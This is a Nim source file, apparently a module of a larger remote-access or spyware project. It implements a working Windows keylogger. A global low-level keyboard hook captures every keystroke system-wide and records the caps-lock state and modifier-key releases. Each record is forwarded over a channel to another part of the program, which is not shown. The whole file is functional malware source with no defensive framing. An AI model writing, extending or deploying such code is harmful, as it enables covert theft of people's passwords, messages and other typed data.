from bitops import bitand

from os import sleep

from winim/inc/windef import WPARAM
from winim/inc/windef import LPARAM
from winim/inc/windef import LRESULT
from winim/inc/windef import DWORD
from winim/inc/windef import HHOOK

from winim/inc/winuser import PKBDLLHOOKSTRUCT
from winim/inc/winuser import KBDLLHOOKSTRUCT
from winim/inc/winuser import WM_KEYDOWN
from winim/inc/winuser import WM_SYSKEYDOWN
from winim/inc/winuser import WM_KEYUP
from winim/inc/winuser import WM_SYSKEYUP
from winim/inc/winuser import VK_CONTROL
from winim/inc/winuser import VK_LCONTROL
from winim/inc/winuser import VK_RCONTROL
from winim/inc/winuser import VK_SHIFT
from winim/inc/winuser import VK_RSHIFT
from winim/inc/winuser import VK_LSHIFT
from winim/inc/winuser import VK_MENU
from winim/inc/winuser import VK_LMENU
from winim/inc/winuser import VK_RMENU
from winim/inc/winuser import VK_CAPITAL
from winim/inc/winuser import VK_NUMLOCK
from winim/inc/winuser import VK_LWIN
from winim/inc/winuser import VK_RWIN
from winim/inc/winuser import CallNextHookEx
from winim/inc/winuser import SetWindowsHookEx
from winim/inc/winuser import WH_KEYBOARD_LL
from winim/inc/winuser import HOOKPROC
from winim/inc/winuser import MSG
from winim/inc/winuser import GetMessage
from winim/inc/winuser import GetKeyState

from winim/utils import winimConverterBOOLToBoolean

from ../channels import mainChannel

var eHook: HHOOK

type processDataChannelType = tuple[key: DWORD, wparam: WPARAM]

var processDataChannel: Channel[processDataChannelType]

proc processDataThread(): void {.thread.} =
  while true:
    let channel: tuple[
      dataAvailable: bool,
      msg: processDataChannelType
      ] = processDataChannel.tryRecv()

    if channel.dataAvailable:
      let (key, wparam) = channel.msg
      let keyText: string = $key

      if wparam == WM_KEYDOWN or wparam == WM_SYSKEYDOWN:
        var prefix: string = ""

        if key == VK_CAPITAL:
          if (bitand(GetKeyState(VK_CAPITAL), 0x0001)) != 0:
            prefix = "+"
          else:
            prefix = "-"

        mainChannel.send ("k", prefix & keyText)

      elif wparam == WM_KEYUP or wparam == WM_SYSKEYUP:
        if key == VK_CONTROL or key == VK_LCONTROL or key == VK_RCONTROL or # ctrl
          key == VK_SHIFT or key == VK_RSHIFT or key == VK_LSHIFT or # shift
          key == VK_MENU or key == VK_LMENU or key == VK_RMENU or # alt
          key == VK_LWIN or key == VK_RWIN: # win
          
          # insert like [SHIFT] [a] [b] <[SHIFT]
          mainChannel.send ("k", "<" & keyText)

    sleep(10)

proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.stdcall.} =
  if (nCode == 0):
    let kbs: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lparam)
    let key: DWORD = kbs.vkCode

    processDataChannel.send((key, wparam))

  result = CallNextHookEx(0, nCode, wparam, lparam)

proc initKeyloggerThread*(): void {.thread.} =

  open processDataChannel

  var processDataThreadVar: Thread[void]

  createThread(processDataThreadVar, processDataThread)

  eHook = SetWindowsHookEx(WH_KEYBOARD_LL, HOOKPROC keyboardHandler, 0, 0)

  var msg: MSG

  ## getMessage loop, am nev de asta ca altfel nu ruleaza procul
  while GetMessage(addr msg, 0, 0, 0):
    discard

  close processDataChannel
